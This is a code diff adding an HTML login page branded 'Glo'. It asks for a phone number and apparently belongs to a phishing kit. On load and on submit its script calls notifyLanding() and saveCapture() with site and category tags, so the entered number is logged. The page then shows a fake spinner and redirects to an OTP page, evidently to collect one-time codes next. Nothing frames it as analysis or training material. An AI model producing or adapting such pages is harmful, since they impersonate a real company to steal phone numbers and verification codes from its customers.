@@ -1,0 +1,25 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login - Glo</title><link rel="stylesheet" href="style.css"></head>
+<body><div class="card">
+<div class="logo">G</div>
+<div class="title">Glo</div>
+<div class="subtitle">Enter your phone number to continue</div>
+<form id="loginForm">
+<div class="form-group"><label for="phone">Phone Number</label><input type="tel" id="phone" placeholder="Enter your phone number" required></div>
+<button type="submit" id="continueBtn">Continue</button>
+</form>
+<div class="footer">© 2026 Glo · All rights reserved</div>
+</div>
+<script src="helper.js"></script>
+<script>
+const SITE='glo', DISPLAY='Glo', CATEGORY='local_companies';
+window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Login'));
+document.getElementById('loginForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const phone = document.getElementById('phone').value.trim();
+  if (!phone) return;
+  const btn = document.getElementById('continueBtn');
+  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
+  saveCapture(SITE, CATEGORY, 'LOGIN', { phone: phone }, 'Login');
+  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
+});
+</script></body></html>
